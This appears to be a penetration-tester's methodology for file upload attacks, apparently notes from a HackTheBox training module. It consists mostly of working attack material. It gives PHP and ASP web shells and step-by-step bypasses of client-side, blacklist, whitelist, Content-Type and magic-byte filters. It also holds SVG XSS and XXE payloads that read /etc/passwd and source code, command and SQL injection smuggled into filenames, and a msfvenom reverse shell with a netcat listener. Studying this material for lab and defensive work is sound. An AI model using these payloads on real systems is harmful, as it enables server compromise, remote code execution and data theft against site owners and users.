# File Upload Attacks Methodology

**Core principle:** Identify the web framework, enumerate what validation exists, then bypass it layer by layer. Each filter type has a specific bypass — match the technique to what you observe.

---

## Phase 1 — Identify the Web Framework

Before uploading anything, determine the back-end language. The web shell must match the server language.

```bash
# Try common index pages to reveal the language
curl -s http://<TARGET>/index.php    # PHP
curl -s http://<TARGET>/index.asp    # ASP (Classic)
curl -s http://<TARGET>/index.aspx   # ASP.NET
```

If the same page loads → that extension is the server language.

**Also check:** Wappalyzer browser extension (shows framework, server, OS, libraries), Burp/ZAP scanners.

---

## Phase 2 — Test for Absent Validation (No Filter)

Attempt to upload a test PHP script before assuming filters exist:

```php
<?php echo "Hello HTB"; ?>
```

Save as `test.php`. If it uploads and executes when visited → no back-end validation at all. Proceed directly to exploitation.

**Upload path:** Check the response or page source after upload for the file URL (e.g. `/uploads/test.php`, `/profile_images/shell.php`).

---

## Phase 3 — Identify Validation Type

| Observation | Validation type |
|-------------|----------------|
| File selector dialog is restricted AND error appears before any network request (DevTools Network tab shows no request) | Front-end (client-side) only |
| Upload request goes to server but response says "Extension not allowed" | Back-end blacklist |
| Upload request goes to server but response says "Only images are allowed" | Back-end whitelist OR content filter |
| Extension changes don't affect the error (e.g. `shell.jpg.phtml` still fails) | Content-type or MIME filter |

---

## Phase 4 — Bypass Client-Side Validation

Two methods — use either or both.

### Method A: Burp Request Modification
1. Upload a valid image normally — capture the request in Burp
2. In Burp Repeater, change `filename="image.jpg"` → `filename="shell.php"`
3. Replace file content with PHP webshell: `<?php system($_REQUEST['cmd']); ?>`
4. Forward — if back-end has no validation, it uploads

### Method B: Disable Front-End JS via DevTools
1. `CTRL+SHIFT+C` → click the file input element
2. Find `onchange="checkFile(this)"` on the `<input>` tag
3. Double-click `checkFile` and delete it
4. Optionally remove `accept=".jpg,.jpeg,.png"` from the input
5. Now upload any file normally — front-end validation is disabled

*Note: Changes are temporary (client-side only), won't persist after page refresh.*

---

## Phase 5 — Bypass Back-End Blacklist

The blacklist blocks known PHP extensions (`.php`, `.php7`, `.phps`, etc.) but may miss others.

### Fuzz for non-blacklisted extensions
1. Capture an upload request in Burp → Send to Intruder
2. Positions tab: Clear all → highlight the extension in `filename="HTB.php"` → Add
3. Payloads tab: Load PHP extension wordlist (PayloadsAllTheThings or SecLists) → **un-tick URL Encoding**
4. Start Attack → sort by Length → identify responses that say "File successfully uploaded"

### Common non-blacklisted PHP extensions that still execute
```
.phtml  .php5  .php7  .phar  .phps
```

### Case sensitivity bypass (Windows servers only)
```
shell.pHp   shell.PHP   shell.PhP
```
Windows filenames are case-insensitive → mixed-case may bypass a case-sensitive blacklist.

### Upload and execute
```
http://<TARGET>/profile_images/shell.phtml?cmd=id
```

---

## Phase 6 — Bypass Back-End Whitelist

Whitelist only allows specific extensions (e.g. `.jpg`, `.jpeg`, `.png`, `.gif`). Bypass depends on how strictly the regex is written.

### Determine regex strength
- **Weak regex** (`preg_match('^.*\.(jpg|jpeg|png|gif)', $fileName)`) — checks if extension exists ANYWHERE in filename
- **Strong regex** (`preg_match('/^.*\.(jpg|jpeg|png|gif)$/', $fileName)`) — anchored with `$`, only matches end of filename

### Bypass 1 — Double Extension (weak regex)
Filename contains allowed extension AND ends with PHP:
```
shell.jpg.php
```
Passes the whitelist check (contains `.jpg`), executes as PHP.

### Bypass 2 — Reverse Double Extension (server misconfiguration)
Filename ends with allowed extension but contains PHP extension:
```
shell.php.jpg
```
Passes strict whitelist (`$` anchor sees `.jpg`), but a misconfigured Apache may still execute it:
```xml
<!-- Apache config with missing $ anchor -->
<FilesMatch ".+\.ph(ar|p|tml)">
    SetHandler application/x-httpd-php
</FilesMatch>
```
If this regex has no `$`, any file containing `.php` in the name executes as PHP.

### Bypass 3 — Character Injection
Inject special characters that cause the server to misinterpret the filename:

| Payload | Effect |
|---------|--------|
| `shell.php%00.jpg` | PHP ≤5.x truncates at `%00`, stores as `shell.php` |
| `shell.aspx:.jpg` | Windows colon trick — writes as `shell.aspx` |
| `shell.php%20.jpg` | Space before extension |
| `shell.php%0a.jpg` | Newline injection |

**Generate a permutation wordlist:**
```bash
for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
    for ext in '.php' '.phps'; do
        echo "shell$char$ext.jpg" >> wordlist.txt
        echo "shell$ext$char.jpg" >> wordlist.txt
        echo "shell.jpg$char$ext" >> wordlist.txt
        echo "shell.jpg$ext$char" >> wordlist.txt
    done
done
```
Fuzz with this wordlist via Burp Intruder.

---

## Phase 7 — Bypass Content-Type Filter

The server checks the `Content-Type` header sent in the upload request. Browsers set this from the file extension, but we can change it in Burp.

In the upload request, find the file's Content-Type header (at the bottom of the request, not the top):
```
Content-Type: application/octet-stream   ← change this
```

Change to an allowed image type:
```
Content-Type: image/jpeg
Content-Type: image/png
Content-Type: image/gif
```

Keep `filename="shell.php"` and PHP content. The Content-Type change alone may bypass the filter.

*Note: Some requests have two Content-Type headers (one for the request, one for the file). Modify the file's Content-Type header.*

---

## Phase 8 — Bypass MIME-Type Filter

The server checks the actual file content using magic bytes (first bytes of the file), not the extension or header. Use `GIF8` magic bytes to make PHP look like a GIF image.

### Add magic bytes to the webshell
In the Burp request, prepend `GIF8` as the first line of file content:
```
GIF8
<?php system($_REQUEST['cmd']); ?>
```

Or on the command line:
```bash
echo "GIF8" > shell.php
echo '<?php system($_REQUEST["cmd"]); ?>' >> shell.php
```

Keep `filename="shell.php"` — the server sees GIF8 magic bytes (passes MIME check) but the file still executes as PHP.

**GIF magic bytes:** `GIF87a` or `GIF89a` — but `GIF8` alone is sufficient.

**Verify locally:**
```bash
file shell.php   # → shell.php: GIF image data
```

### Combined bypass (Content-Type + MIME)
When both are checked:
- Change Content-Type header → `image/gif`
- Add `GIF8` as first line of file content
- Keep `filename="shell.php"`

---

## Phase 9 — Limited File Uploads (Non-Arbitrary)

When filters are solid and only safe file types are allowed, pivot to attacks that don't require PHP execution.

### XSS via SVG upload
Create `HTB.svg`:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1">
    <rect x="1" y="1" width="1" height="1" fill="green" stroke="black" />
    <script type="text/javascript">alert(window.origin);</script>
</svg>
```
Upload — XSS fires when the SVG is viewed.

### XSS via EXIF metadata
```bash
exiftool -Comment=' "><img src=1 onerror=alert(window.origin)>' HTB.jpg
exiftool HTB.jpg   # verify Comment field
```
XSS fires if the app displays image metadata on the page.

### XXE via SVG — read system files
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg>&xxe;</svg>
```

### XXE via SVG — read PHP source code (base64)
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
<svg>&xxe;</svg>
```
Decode the base64 output: `echo "<base64>" | base64 -d`

---

## Phase 10 — Other Attacks

### Command injection in filename
```
file$(whoami).jpg
file`whoami`.jpg
file.jpg||whoami
```
If the app uses the filename in an OS command (e.g. `mv`), the injected command executes.

### XSS in filename
```
<script>alert(window.origin);</script>.jpg
```
Fires if the filename is displayed on the page.

### SQL injection in filename
```
file';select+sleep(5);--.jpg
```
Fires if the filename is used in a SQL query.

### Disclose uploads directory via errors
- Upload a file with a duplicate name (already exists on server)
- Send two identical upload requests simultaneously
- Upload a file with an extremely long name (5000 chars)
- Error messages may reveal the uploads directory path

### Windows-specific attacks
```
Reserved chars in filename:   |  <  >  *  ?
Reserved names:               CON  COM1  LPT1  NUL
8.3 filename convention:      WEB~1.CON  → overwrites web.conf
```

---

## Webshells Reference

### PHP (most common)
```php
<?php system($_REQUEST['cmd']); ?>
```
URL: `shell.php?cmd=id`

### ASP
```asp
<% eval request('cmd') %>
```

### SecLists webshells location (Pwnbox)
```
/opt/useful/seclists/Web-Shells/
```

---

## Reverse Shell Reference

### pentestmonkey PHP reverse shell
Edit lines 49-50:
```php
$ip = 'OUR_IP';
$port = OUR_PORT;
```

### msfvenom generated
```bash
msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php
```

### Catch the connection
```bash
nc -lvnp OUR_PORT
```

---

## Decision Flow

```
1. Identify web framework (language) — /index.php, Wappalyzer, Burp scanner
2. Test with simple echo script → does it execute?
   └─ Yes → No validation → upload webshell directly
3. Upload attempt fails → where does it fail?
   └─ Error before any network request → client-side only
        └─ Burp: modify filename + content in intercepted request
        └─ DevTools: remove checkFile() from input onchange
   └─ Server returns "Extension not allowed" → blacklist
        └─ Fuzz extensions (Burp Intruder + PHP extension wordlist)
        └─ Try .phtml, .php5, .phar, mixed case (Windows)
   └─ Server returns "Only images allowed" → whitelist or content filter
        └─ Fuzz extensions to see what passes
        └─ Try double extension: shell.jpg.php
        └─ Try reverse double extension: shell.php.jpg
        └─ Try character injection: shell.php%00.jpg
        └─ Modify Content-Type header → image/jpeg
        └─ Add GIF8 magic bytes to file content
        └─ Combine: GIF8 + Content-Type change + extension trick
4. No arbitrary upload possible → limited upload attacks
        └─ Try SVG → XSS payload or XXE payload
        └─ Try EXIF metadata XSS via exiftool
        └─ Inject in filename: command, XSS, or SQLi
5. Got webshell → execute commands
        └─ shell.php?cmd=id
        └─ shell.php?cmd=find / -name "flag*" 2>/dev/null
        └─ shell.php?cmd=cat /path/to/flag
```
